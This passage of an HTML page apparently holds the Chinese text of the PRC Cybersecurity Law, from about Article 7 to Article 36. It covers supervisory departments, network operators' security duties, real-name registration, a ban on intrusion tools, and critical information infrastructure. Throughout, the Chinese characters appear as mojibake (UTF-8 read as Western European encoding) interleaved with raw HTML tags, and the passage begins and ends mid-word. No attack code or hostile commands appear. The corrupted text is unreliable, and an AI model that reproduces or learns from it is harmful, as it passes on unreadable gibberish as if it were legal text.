‡å‡†åˆ¶å®šã€æ‰“å‡»ç½‘ç»œè¿æ³•çŠ¯ç½ªç­‰æ–¹é¢çš„å›½é™…äº¤æµä¸åˆä½œï¼Œæ¨åŠ¨æ„å»ºå’Œå¹³ã€å®‰å…¨ã€å¼€æ”¾ã€åˆä½œçš„ç½‘ç»œç©ºé—´ï¼Œå»ºç«‹å¤šè¾¹ã€æ°‘ä¸»ã€é€æ˜çš„ç½‘ç»œæ²»ç†ä½“ç³»ã€‚</p><p>ã€€ã€€ç¬¬å…«æ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨è´Ÿè´£ç»Ÿç­¹åè°ƒç½‘ç»œå®‰å…¨å·¥ä½œå’Œç›¸å…³ç›‘ç£ç®¡ç†å·¥ä½œã€‚å›½åŠ¡é™¢ç”µä¿¡ä¸»ç®¡éƒ¨é—¨ã€å…¬å®‰éƒ¨é—¨å’Œå…¶ä»–æœ‰å…³æœºå…³ä¾ç…§æœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œåœ¨å„è‡ªèŒè´£èŒƒå›´å†…è´Ÿè´£ç½‘ç»œå®‰å…¨ä¿æŠ¤å’Œç›‘ç£ç®¡ç†å·¥ä½œã€‚</p><p>ã€€ã€€å¿çº§ä»¥ä¸Šåœ°æ–¹äººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨çš„ç½‘ç»œå®‰å…¨ä¿æŠ¤å’Œç›‘ç£ç®¡ç†èŒè´£ï¼ŒæŒ‰ç…§å›½å®¶æœ‰å…³è§„å®šç¡®å®šã€‚</p><p>ã€€ã€€ç¬¬ä¹æ¡ã€€ç½‘ç»œè¿è¥è€…å¼€å±•ç»è¥å’ŒæœåŠ¡æ´»åŠ¨ï¼Œå¿…é¡»éµå®ˆæ³•å¾‹ã€è¡Œæ”¿æ³•è§„ï¼Œå°Šé‡ç¤¾ä¼šå…¬å¾·ï¼Œéµå®ˆå•†ä¸šé“å¾·ï¼Œè¯šå®ä¿¡ç”¨ï¼Œå±¥è¡Œç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œæ¥å—æ”¿åºœå’Œç¤¾ä¼šçš„ç›‘ç£ï¼Œæ‰¿æ‹…ç¤¾ä¼šè´£ä»»ã€‚</p><p>ã€€ã€€ç¬¬åæ¡ã€€å»ºè®¾ã€è¿è¥ç½‘ç»œæˆ–è€…é€šè¿‡ç½‘ç»œæä¾›æœåŠ¡ï¼Œåº”å½“ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå’Œå›½å®¶æ ‡å‡†çš„å¼ºåˆ¶æ€§è¦æ±‚ï¼Œé‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œä¿éšœç½‘ç»œå®‰å…¨ã€ç¨³å®šè¿è¡Œï¼Œæœ‰æ•ˆåº”å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œé˜²èŒƒç½‘ç»œè¿æ³•çŠ¯ç½ªæ´»åŠ¨ï¼Œç»´æŠ¤ç½‘ç»œæ•°æ®çš„å®Œæ•´æ€§ã€ä¿å¯†æ€§å’Œå¯ç”¨æ€§ã€‚</p><p>ã€€ã€€ç¬¬åä¸€æ¡ã€€ç½‘ç»œç›¸å…³è¡Œä¸šç»„ç»‡æŒ‰ç…§ç« ç¨‹ï¼ŒåŠ å¼ºè¡Œä¸šè‡ªå¾‹ï¼Œåˆ¶å®šç½‘ç»œå®‰å…¨è¡Œä¸ºè§„èŒƒï¼ŒæŒ‡å¯¼ä¼šå‘˜åŠ å¼ºç½‘ç»œå®‰å…¨ä¿æŠ¤ï¼Œæé«˜ç½‘ç»œå®‰å…¨ä¿æŠ¤æ°´å¹³ï¼Œä¿ƒè¿›è¡Œä¸šå¥åº·å‘å±•ã€‚</p><p>ã€€ã€€ç¬¬åäºŒæ¡ã€€å›½å®¶ä¿æŠ¤å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡ä¾æ³•ä½¿ç”¨ç½‘ç»œçš„æƒåˆ©ï¼Œä¿ƒè¿›ç½‘ç»œæ¥å…¥æ™®åŠï¼Œæå‡ç½‘ç»œæœåŠ¡æ°´å¹³ï¼Œä¸ºç¤¾ä¼šæä¾›å®‰å…¨ã€ä¾¿åˆ©çš„ç½‘ç»œæœåŠ¡ï¼Œä¿éšœç½‘ç»œä¿¡æ¯ä¾æ³•æœ‰åºè‡ªç”±æµåŠ¨ã€‚</p><p>ã€€ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡ä½¿ç”¨ç½‘ç»œåº”å½“éµå®ˆå®ªæ³•æ³•å¾‹ï¼Œéµå®ˆå…¬å…±ç§©åºï¼Œå°Šé‡ç¤¾ä¼šå…¬å¾·ï¼Œä¸å¾—å±å®³ç½‘ç»œå®‰å…¨ï¼Œä¸å¾—åˆ©ç”¨ç½‘ç»œä»äº‹å±å®³å›½å®¶å®‰å…¨ã€è£èª‰å’Œåˆ©ç›Šï¼Œç…½åŠ¨é¢ è¦†å›½å®¶æ”¿æƒã€æ¨ç¿»ç¤¾ä¼šä¸»ä¹‰åˆ¶åº¦ï¼Œç…½åŠ¨åˆ†è£‚å›½å®¶ã€ç ´åå›½å®¶ç»Ÿä¸€ï¼Œå®£æ‰¬ææ€–ä¸»ä¹‰ã€æç«¯ä¸»ä¹‰ï¼Œå®£æ‰¬æ°‘æ—ä»‡æ¨ã€æ°‘æ—æ­§è§†ï¼Œä¼ æ’­æš´åŠ›ã€æ·«ç§½è‰²æƒ…ä¿¡æ¯ï¼Œç¼–é€ ã€ä¼ æ’­è™šå‡ä¿¡æ¯æ‰°ä¹±ç»æµç§©åºå’Œç¤¾ä¼šç§©åºï¼Œä»¥åŠä¾µå®³ä»–äººåèª‰ã€éšç§ã€çŸ¥è¯†äº§æƒå’Œå…¶ä»–åˆæ³•æƒç›Šç­‰æ´»åŠ¨ã€‚</p><p>ã€€ã€€ç¬¬åä¸‰æ¡ã€€å›½å®¶æ”¯æŒç ”ç©¶å¼€å‘æœ‰åˆ©äºæœªæˆå¹´äººå¥åº·æˆé•¿çš„ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œä¾æ³•æƒ©æ²»åˆ©ç”¨ç½‘ç»œä»äº‹å±å®³æœªæˆå¹´äººèº«å¿ƒå¥åº·çš„æ´»åŠ¨ï¼Œä¸ºæœªæˆå¹´äººæä¾›å®‰å…¨ã€å¥åº·çš„ç½‘ç»œç¯å¢ƒã€‚</p><p>ã€€ã€€ç¬¬åå››æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡æœ‰æƒå¯¹å±å®³ç½‘ç»œå®‰å…¨çš„è¡Œä¸ºå‘ç½‘ä¿¡ã€ç”µä¿¡ã€å…¬å®‰ç­‰éƒ¨é—¨ä¸¾æŠ¥ã€‚æ”¶åˆ°ä¸¾æŠ¥çš„éƒ¨é—¨åº”å½“åŠæ—¶ä¾æ³•ä½œå‡ºå¤„ç†ï¼›ä¸å±äºæœ¬éƒ¨é—¨èŒè´£çš„ï¼Œåº”å½“åŠæ—¶ç§»é€æœ‰æƒå¤„ç†çš„éƒ¨é—¨ã€‚</p><p>ã€€ã€€æœ‰å…³éƒ¨é—¨åº”å½“å¯¹ä¸¾æŠ¥äººçš„ç›¸å…³ä¿¡æ¯äºˆä»¥ä¿å¯†ï¼Œä¿æŠ¤ä¸¾æŠ¥äººçš„åˆæ³•æƒç›Šã€‚</p><p><strong>ã€€ã€€ç¬¬äºŒç« ã€€ç½‘ç»œå®‰å…¨æ”¯æŒä¸ä¿ƒè¿›</strong></p><p>ã€€ã€€ç¬¬åäº”æ¡ã€€å›½å®¶å»ºç«‹å’Œå®Œå–„ç½‘ç»œå®‰å…¨æ ‡å‡†ä½“ç³»ã€‚å›½åŠ¡é™¢æ ‡å‡†åŒ–è¡Œæ”¿ä¸»ç®¡éƒ¨é—¨å’Œå›½åŠ¡é™¢å…¶ä»–æœ‰å…³éƒ¨é—¨æ ¹æ®å„è‡ªçš„èŒè´£ï¼Œç»„ç»‡åˆ¶å®šå¹¶é€‚æ—¶ä¿®è®¢æœ‰å…³ç½‘ç»œå®‰å…¨ç®¡ç†ä»¥åŠç½‘ç»œäº§å“ã€æœåŠ¡å’Œè¿è¡Œå®‰å…¨çš„å›½å®¶æ ‡å‡†ã€è¡Œä¸šæ ‡å‡†ã€‚</p><p>ã€€ã€€å›½å®¶æ”¯æŒä¼ä¸šã€ç ”ç©¶æœºæ„ã€é«˜ç­‰å­¦æ ¡ã€ç½‘ç»œç›¸å…³è¡Œä¸šç»„ç»‡å‚ä¸ç½‘ç»œå®‰å…¨å›½å®¶æ ‡å‡†ã€è¡Œä¸šæ ‡å‡†çš„åˆ¶å®šã€‚</p><p>ã€€ã€€ç¬¬åå…­æ¡ã€€å›½åŠ¡é™¢å’Œçœã€è‡ªæ²»åŒºã€ç›´è¾–å¸‚äººæ°‘æ”¿åºœåº”å½“ç»Ÿç­¹è§„åˆ’ï¼ŒåŠ å¤§æŠ•å…¥ï¼Œæ‰¶æŒé‡ç‚¹ç½‘ç»œå®‰å…¨æŠ€æœ¯äº§ä¸šå’Œé¡¹ç›®ï¼Œæ”¯æŒç½‘ç»œå®‰å…¨æŠ€æœ¯çš„ç ”ç©¶å¼€å‘å’Œåº”ç”¨ï¼Œæ¨å¹¿å®‰å…¨å¯ä¿¡çš„ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œä¿æŠ¤ç½‘ç»œæŠ€æœ¯çŸ¥è¯†äº§æƒï¼Œæ”¯æŒä¼ä¸šã€ç ”ç©¶æœºæ„å’Œé«˜ç­‰å­¦æ ¡ç­‰å‚ä¸å›½å®¶ç½‘ç»œå®‰å…¨æŠ€æœ¯åˆ›æ–°é¡¹ç›®ã€‚</p><p>ã€€ã€€ç¬¬åä¸ƒæ¡ã€€å›½å®¶æ¨è¿›ç½‘ç»œå®‰å…¨ç¤¾ä¼šåŒ–æœåŠ¡ä½“ç³»å»ºè®¾ï¼Œé¼“åŠ±æœ‰å…³ä¼ä¸šã€æœºæ„å¼€å±•ç½‘ç»œå®‰å…¨è®¤è¯ã€æ£€æµ‹å’Œé£é™©è¯„ä¼°ç­‰å®‰å…¨æœåŠ¡ã€‚</p><p>ã€€ã€€ç¬¬åå…«æ¡ã€€å›½å®¶é¼“åŠ±å¼€å‘ç½‘ç»œæ•°æ®å®‰å…¨ä¿æŠ¤å’Œåˆ©ç”¨æŠ€æœ¯ï¼Œä¿ƒè¿›å…¬å…±æ•°æ®èµ„æºå¼€æ”¾ï¼Œæ¨åŠ¨æŠ€æœ¯åˆ›æ–°å’Œç»æµç¤¾ä¼šå‘å±•ã€‚</p><p>ã€€ã€€å›½å®¶æ”¯æŒåˆ›æ–°ç½‘ç»œå®‰å…¨ç®¡ç†æ–¹å¼ï¼Œè¿ç”¨ç½‘ç»œæ–°æŠ€æœ¯ï¼Œæå‡ç½‘ç»œå®‰å…¨ä¿æŠ¤æ°´å¹³ã€‚</p><p>ã€€ã€€ç¬¬åä¹æ¡ã€€å„çº§äººæ°‘æ”¿åºœåŠå…¶æœ‰å…³éƒ¨é—¨åº”å½“ç»„ç»‡å¼€å±•ç»å¸¸æ€§çš„ç½‘ç»œå®‰å…¨å®£ä¼ æ•™è‚²ï¼Œå¹¶æŒ‡å¯¼ã€ç£ä¿ƒæœ‰å…³å•ä½åšå¥½ç½‘ç»œå®‰å…¨å®£ä¼ æ•™è‚²å·¥ä½œã€‚</p><p>ã€€ã€€å¤§ä¼—ä¼ æ’­åª’ä»‹åº”å½“æœ‰é’ˆå¯¹æ€§åœ°é¢å‘ç¤¾ä¼šè¿›è¡Œç½‘ç»œå®‰å…¨å®£ä¼ æ•™è‚²ã€‚</p><p>ã€€ã€€ç¬¬äºŒåæ¡ã€€å›½å®¶æ”¯æŒä¼ä¸šå’Œé«˜ç­‰å­¦æ ¡ã€èŒä¸šå­¦æ ¡ç­‰æ•™è‚²åŸ¹è®­æœºæ„å¼€å±•ç½‘ç»œå®‰å…¨ç›¸å…³æ•™è‚²ä¸åŸ¹è®­ï¼Œé‡‡å–å¤šç§æ–¹å¼åŸ¹å…»ç½‘ç»œå®‰å…¨äººæ‰ï¼Œä¿ƒè¿›ç½‘ç»œå®‰å…¨äººæ‰äº¤æµã€‚</p><div width="100%"><p></p><p></p></div>  </div><div id="content" class="content1"><div style="text-align: center;"></div> <p><strong>ã€€ã€€ç¬¬ä¸‰ç« ã€€ç½‘ç»œè¿è¡Œå®‰å…¨</strong></p><p>ã€€ã€€ç¬¬ä¸€èŠ‚ã€€ä¸€èˆ¬è§„å®š</p><p>ã€€ã€€ç¬¬äºŒåä¸€æ¡ã€€å›½å®¶å®è¡Œç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ã€‚ç½‘ç»œè¿è¥è€…åº”å½“æŒ‰ç…§ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„è¦æ±‚ï¼Œå±¥è¡Œä¸‹åˆ—å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œä¿éšœç½‘ç»œå…å—å¹²æ‰°ã€ç ´åæˆ–è€…æœªç»æˆæƒçš„è®¿é—®ï¼Œé˜²æ­¢ç½‘ç»œæ•°æ®æ³„éœ²æˆ–è€…è¢«çªƒå–ã€ç¯¡æ”¹ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰åˆ¶å®šå†…éƒ¨å®‰å…¨ç®¡ç†åˆ¶åº¦å’Œæ“ä½œè§„ç¨‹ï¼Œç¡®å®šç½‘ç»œå®‰å…¨è´Ÿè´£äººï¼Œè½å®ç½‘ç»œå®‰å…¨ä¿æŠ¤è´£ä»»ï¼›</p><p>ã€€ã€€ï¼ˆäºŒï¼‰é‡‡å–é˜²èŒƒè®¡ç®—æœºç—…æ¯’å’Œç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰å±å®³ç½‘ç»œå®‰å…¨è¡Œä¸ºçš„æŠ€æœ¯æªæ–½ï¼›</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰é‡‡å–ç›‘æµ‹ã€è®°å½•ç½‘ç»œè¿è¡ŒçŠ¶æ€ã€ç½‘ç»œå®‰å…¨äº‹ä»¶çš„æŠ€æœ¯æªæ–½ï¼Œå¹¶æŒ‰ç…§è§„å®šç•™å­˜ç›¸å…³çš„ç½‘ç»œæ—¥å¿—ä¸å°‘äºå…­ä¸ªæœˆï¼›</p><p>ã€€ã€€ï¼ˆå››ï¼‰é‡‡å–æ•°æ®åˆ†ç±»ã€é‡è¦æ•°æ®å¤‡ä»½å’ŒåŠ å¯†ç­‰æªæ–½ï¼›</p><p>ã€€ã€€ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–ä¹‰åŠ¡ã€‚</p><p>ã€€ã€€ç¬¬äºŒåäºŒæ¡ã€€ç½‘ç»œäº§å“ã€æœåŠ¡åº”å½“ç¬¦åˆç›¸å…³å›½å®¶æ ‡å‡†çš„å¼ºåˆ¶æ€§è¦æ±‚ã€‚ç½‘ç»œäº§å“ã€æœåŠ¡çš„æä¾›è€…ä¸å¾—è®¾ç½®æ¶æ„ç¨‹åºï¼›å‘ç°å…¶ç½‘ç»œäº§å“ã€æœåŠ¡å­˜åœ¨å®‰å…¨ç¼ºé™·ã€æ¼æ´ç­‰é£é™©æ—¶ï¼Œåº”å½“ç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼ŒæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ã€€ã€€ç½‘ç»œäº§å“ã€æœåŠ¡çš„æä¾›è€…åº”å½“ä¸ºå…¶äº§å“ã€æœåŠ¡æŒç»­æä¾›å®‰å…¨ç»´æŠ¤ï¼›åœ¨è§„å®šæˆ–è€…å½“äº‹äººçº¦å®šçš„æœŸé™å†…ï¼Œä¸å¾—ç»ˆæ­¢æä¾›å®‰å…¨ç»´æŠ¤ã€‚</p><p>ã€€ã€€ç½‘ç»œäº§å“ã€æœåŠ¡å…·æœ‰æ”¶é›†ç”¨æˆ·ä¿¡æ¯åŠŸèƒ½çš„ï¼Œå…¶æä¾›è€…åº”å½“å‘ç”¨æˆ·æ˜ç¤ºå¹¶å–å¾—åŒæ„ï¼›æ¶‰åŠç”¨æˆ·ä¸ªäººä¿¡æ¯çš„ï¼Œè¿˜åº”å½“éµå®ˆæœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å…³äºä¸ªäººä¿¡æ¯ä¿æŠ¤çš„è§„å®šã€‚</p><p>ã€€ã€€ç¬¬äºŒåä¸‰æ¡ã€€ç½‘ç»œå…³é”®è®¾å¤‡å’Œç½‘ç»œå®‰å…¨ä¸“ç”¨äº§å“åº”å½“æŒ‰ç…§ç›¸å…³å›½å®¶æ ‡å‡†çš„å¼ºåˆ¶æ€§è¦æ±‚ï¼Œç”±å…·å¤‡èµ„æ ¼çš„æœºæ„å®‰å…¨è®¤è¯åˆæ ¼æˆ–è€…å®‰å…¨æ£€æµ‹ç¬¦åˆè¦æ±‚åï¼Œæ–¹å¯é”€å”®æˆ–è€…æä¾›ã€‚å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨åˆ¶å®šã€å…¬å¸ƒç½‘ç»œå…³é”®è®¾å¤‡å’Œç½‘ç»œå®‰å…¨ä¸“ç”¨äº§å“ç›®å½•ï¼Œå¹¶æ¨åŠ¨å®‰å…¨è®¤è¯å’Œå®‰å…¨æ£€æµ‹ç»“æœäº’è®¤ï¼Œé¿å…é‡å¤è®¤è¯ã€æ£€æµ‹ã€‚</p><p>ã€€ã€€ç¬¬äºŒåå››æ¡ã€€ç½‘ç»œè¿è¥è€…ä¸ºç”¨æˆ·åŠç†ç½‘ç»œæ¥å…¥ã€åŸŸåæ³¨å†ŒæœåŠ¡ï¼ŒåŠç†å›ºå®šç”µè¯ã€ç§»åŠ¨ç”µè¯ç­‰å…¥ç½‘æ‰‹ç»­ï¼Œæˆ–è€…ä¸ºç”¨æˆ·æä¾›ä¿¡æ¯å‘å¸ƒã€å³æ—¶é€šè®¯ç­‰æœåŠ¡ï¼Œåœ¨ä¸ç”¨æˆ·ç­¾è®¢åè®®æˆ–è€…ç¡®è®¤æä¾›æœåŠ¡æ—¶ï¼Œåº”å½“è¦æ±‚ç”¨æˆ·æä¾›çœŸå®èº«ä»½ä¿¡æ¯ã€‚ç”¨æˆ·ä¸æä¾›çœŸå®èº«ä»½ä¿¡æ¯çš„ï¼Œç½‘ç»œè¿è¥è€…ä¸å¾—ä¸ºå…¶æä¾›ç›¸å…³æœåŠ¡ã€‚</p><p>ã€€ã€€å›½å®¶å®æ–½ç½‘ç»œå¯ä¿¡èº«ä»½æˆ˜ç•¥ï¼Œæ”¯æŒç ”ç©¶å¼€å‘å®‰å…¨ã€æ–¹ä¾¿çš„ç”µå­èº«ä»½è®¤è¯æŠ€æœ¯ï¼Œæ¨åŠ¨ä¸åŒç”µå­èº«ä»½è®¤è¯ä¹‹é—´çš„äº’è®¤ã€‚</p><p>ã€€ã€€ç¬¬äºŒåäº”æ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“åˆ¶å®šç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼ŒåŠæ—¶å¤„ç½®ç³»ç»Ÿæ¼æ´ã€è®¡ç®—æœºç—…æ¯’ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰å®‰å…¨é£é™©ï¼›åœ¨å‘ç”Ÿå±å®³ç½‘ç»œå®‰å…¨çš„äº‹ä»¶æ—¶ï¼Œç«‹å³å¯åŠ¨åº”æ€¥é¢„æ¡ˆï¼Œé‡‡å–ç›¸åº”çš„è¡¥æ•‘æªæ–½ï¼Œå¹¶æŒ‰ç…§è§„å®šå‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ã€€ã€€ç¬¬äºŒåå…­æ¡ã€€å¼€å±•ç½‘ç»œå®‰å…¨è®¤è¯ã€æ£€æµ‹ã€é£é™©è¯„ä¼°ç­‰æ´»åŠ¨ï¼Œå‘ç¤¾ä¼šå‘å¸ƒç³»ç»Ÿæ¼æ´ã€è®¡ç®—æœºç—…æ¯’ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰ç½‘ç»œå®‰å…¨ä¿¡æ¯ï¼Œåº”å½“éµå®ˆå›½å®¶æœ‰å…³è§„å®šã€‚</p><p>ã€€ã€€ç¬¬äºŒåä¸ƒæ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—ä»äº‹éæ³•ä¾µå…¥ä»–äººç½‘ç»œã€å¹²æ‰°ä»–äººç½‘ç»œæ­£å¸¸åŠŸèƒ½ã€çªƒå–ç½‘ç»œæ•°æ®ç­‰å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨ï¼›ä¸å¾—æä¾›ä¸“é—¨ç”¨äºä»äº‹ä¾µå…¥ç½‘ç»œã€å¹²æ‰°ç½‘ç»œæ­£å¸¸åŠŸèƒ½åŠé˜²æŠ¤æªæ–½ã€çªƒå–ç½‘ç»œæ•°æ®ç­‰å±å®³ç½‘ç»œå®‰å…¨æ´»åŠ¨çš„ç¨‹åºã€å·¥å…·ï¼›æ˜çŸ¥ä»–äººä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨çš„ï¼Œä¸å¾—ä¸ºå…¶æä¾›æŠ€æœ¯æ”¯æŒã€å¹¿å‘Šæ¨å¹¿ã€æ”¯ä»˜ç»“ç®—ç­‰å¸®åŠ©ã€‚</p><p>ã€€ã€€ç¬¬äºŒåå…«æ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“ä¸ºå…¬å®‰æœºå…³ã€å›½å®¶å®‰å…¨æœºå…³ä¾æ³•ç»´æŠ¤å›½å®¶å®‰å…¨å’Œä¾¦æŸ¥çŠ¯ç½ªçš„æ´»åŠ¨æä¾›æŠ€æœ¯æ”¯æŒå’ŒååŠ©ã€‚</p><p>ã€€ã€€ç¬¬äºŒåä¹æ¡ã€€å›½å®¶æ”¯æŒç½‘ç»œè¿è¥è€…ä¹‹é—´åœ¨ç½‘ç»œå®‰å…¨ä¿¡æ¯æ”¶é›†ã€åˆ†æã€é€šæŠ¥å’Œåº”æ€¥å¤„ç½®ç­‰æ–¹é¢è¿›è¡Œåˆä½œï¼Œæé«˜ç½‘ç»œè¿è¥è€…çš„å®‰å…¨ä¿éšœèƒ½åŠ›ã€‚</p><p>ã€€ã€€æœ‰å…³è¡Œä¸šç»„ç»‡å»ºç«‹å¥å…¨æœ¬è¡Œä¸šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤è§„èŒƒå’Œåä½œæœºåˆ¶ï¼ŒåŠ å¼ºå¯¹ç½‘ç»œå®‰å…¨é£é™©çš„åˆ†æè¯„ä¼°ï¼Œå®šæœŸå‘ä¼šå‘˜è¿›è¡Œé£é™©è­¦ç¤ºï¼Œæ”¯æŒã€ååŠ©ä¼šå‘˜åº”å¯¹ç½‘ç»œå®‰å…¨é£é™©ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åæ¡ã€€ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨åœ¨å±¥è¡Œç½‘ç»œå®‰å…¨ä¿æŠ¤èŒè´£ä¸­è·å–çš„ä¿¡æ¯ï¼Œåªèƒ½ç”¨äºç»´æŠ¤ç½‘ç»œå®‰å…¨çš„éœ€è¦ï¼Œä¸å¾—ç”¨äºå…¶ä»–ç”¨é€”ã€‚</p><p>ã€€ã€€ç¬¬äºŒèŠ‚ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¡Œå®‰å…¨</p><p>ã€€ã€€ç¬¬ä¸‰åä¸€æ¡ã€€å›½å®¶å¯¹å…¬å…±é€šä¿¡å’Œä¿¡æ¯æœåŠ¡ã€èƒ½æºã€äº¤é€šã€æ°´åˆ©ã€é‡‘èã€å…¬å…±æœåŠ¡ã€ç”µå­æ”¿åŠ¡ç­‰é‡è¦è¡Œä¸šå’Œé¢†åŸŸï¼Œä»¥åŠå…¶ä»–ä¸€æ—¦é­åˆ°ç ´åã€ä¸§å¤±åŠŸèƒ½æˆ–è€…æ•°æ®æ³„éœ²ï¼Œå¯èƒ½ä¸¥é‡å±å®³å›½å®¶å®‰å…¨ã€å›½è®¡æ°‘ç”Ÿã€å…¬å…±åˆ©ç›Šçš„å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ï¼Œåœ¨ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„åŸºç¡€ä¸Šï¼Œå®è¡Œé‡ç‚¹ä¿æŠ¤ã€‚å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å…·ä½“èŒƒå›´å’Œå®‰å…¨ä¿æŠ¤åŠæ³•ç”±å›½åŠ¡é™¢åˆ¶å®šã€‚</p><p>ã€€ã€€å›½å®¶é¼“åŠ±å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä»¥å¤–çš„ç½‘ç»œè¿è¥è€…è‡ªæ„¿å‚ä¸å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä¿æŠ¤ä½“ç³»ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åäºŒæ¡ã€€æŒ‰ç…§å›½åŠ¡é™¢è§„å®šçš„èŒè´£åˆ†å·¥ï¼Œè´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨åˆ†åˆ«ç¼–åˆ¶å¹¶ç»„ç»‡å®æ–½æœ¬è¡Œä¸šã€æœ¬é¢†åŸŸçš„å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨è§„åˆ’ï¼ŒæŒ‡å¯¼å’Œç›‘ç£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½è¿è¡Œå®‰å…¨ä¿æŠ¤å·¥ä½œã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åä¸‰æ¡ã€€å»ºè®¾å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½åº”å½“ç¡®ä¿å…¶å…·æœ‰æ”¯æŒä¸šåŠ¡ç¨³å®šã€æŒç»­è¿è¡Œçš„æ€§èƒ½ï¼Œå¹¶ä¿è¯å®‰å…¨æŠ€æœ¯æªæ–½åŒæ­¥è§„åˆ’ã€åŒæ­¥å»ºè®¾ã€åŒæ­¥ä½¿ç”¨ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åå››æ¡ã€€é™¤æœ¬æ³•ç¬¬äºŒåä¸€æ¡çš„è§„å®šå¤–ï¼Œå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…è¿˜åº”å½“å±¥è¡Œä¸‹åˆ—å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰è®¾ç½®ä¸“é—¨å®‰å…¨ç®¡ç†æœºæ„å’Œå®‰å…¨ç®¡ç†è´Ÿè´£äººï¼Œå¹¶å¯¹è¯¥è´Ÿè´£äººå’Œå…³é”®å²—ä½çš„äººå‘˜è¿›è¡Œå®‰å…¨èƒŒæ™¯å®¡æŸ¥ï¼›</p><p>ã€€ã€€ï¼ˆäºŒï¼‰å®šæœŸå¯¹ä»ä¸šäººå‘˜è¿›è¡Œç½‘ç»œå®‰å…¨æ•™è‚²ã€æŠ€æœ¯åŸ¹è®­å’ŒæŠ€èƒ½è€ƒæ ¸ï¼›</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰å¯¹é‡è¦ç³»ç»Ÿå’Œæ•°æ®åº“è¿›è¡Œå®¹ç¾å¤‡ä»½ï¼›</p><p>ã€€ã€€ï¼ˆå››ï¼‰åˆ¶å®šç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¹¶å®šæœŸè¿›è¡Œæ¼”ç»ƒï¼›</p><p>ã€€ã€€ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–ä¹‰åŠ¡ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åäº”æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…é‡‡è´­ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œå¯èƒ½å½±å“å›½å®¶å®‰å…¨çš„ï¼Œåº”å½“é€šè¿‡å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨ç»„ç»‡çš„å›½å®¶å®‰å…¨å®¡æŸ¥ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰åå…­æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…é‡‡è´­ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œåº”å½“æŒ‰ç…§è§„å®šä¸æä¾›è€…ç­¾è®¢å®‰å…¨ä¿å¯